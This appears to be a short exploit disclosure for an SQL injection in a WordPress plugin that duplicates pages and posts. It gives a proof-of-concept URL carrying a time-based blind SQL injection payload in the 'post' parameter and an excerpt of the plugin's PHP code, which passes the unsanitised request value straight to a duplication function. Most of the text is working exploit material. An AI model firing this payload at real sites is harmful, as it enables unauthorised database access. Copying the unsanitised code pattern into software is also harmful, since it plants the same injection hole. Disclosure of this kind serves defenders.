# Date: 2011-08-22
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 1.2 (tested)
 
---
PoC
---
http://www.site.com/index.php?duplicate=1&post=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
 
---------------
Vulnerable code
---------------
class mm_duplicate_pages_posts
{
    ...
    function mm_duplicate_pages_posts()
    {
        ...
        add_action(&#039;init&#039;, array(&$this, &#039;dup&#039;));
        ...       
    }
 
    function dup()
    {
        if($_GET[&#039;duplicate&#039;])
        {
            $id = $_GET[&#039;post&#039;];
            $dup = new mm_duplicate();
            ...
            $dup->duplicate_post_page($id);
        }
    }
...
}
 
class mm_duplicate
{
    function duplicate_post_page($id)
    {
        ...
        ...
    }
...
}



